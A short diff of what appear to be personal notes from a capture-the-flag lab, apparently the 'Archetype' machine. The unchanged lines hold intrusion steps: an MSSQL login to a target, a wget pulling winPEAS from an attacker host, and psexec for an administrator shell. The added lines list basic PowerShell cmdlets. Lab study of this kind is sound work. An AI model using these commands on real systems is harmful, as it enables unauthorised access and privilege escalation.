@@ -20,3 +20,10 @@ Connecting to mysql server: mssqlclient.py ARCHETYPE/sql_svc@10.129.233.43 -wind
 wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
 
 psexec.py administrator@{TARGET_IP}
+
+Get-Command = gets all the cmdlets installed on the current Computer
+Get-Command | Get-Member -MemberType Method 
+Get-ChildItem | Select-Object -Property Mode, Name = listing the directories and just selecting the mode and the name
+Get-Service | Where-Object -Property Status -eq Stopped = filter objects
+Get-ChildItem | Sort-Object = sort object
+
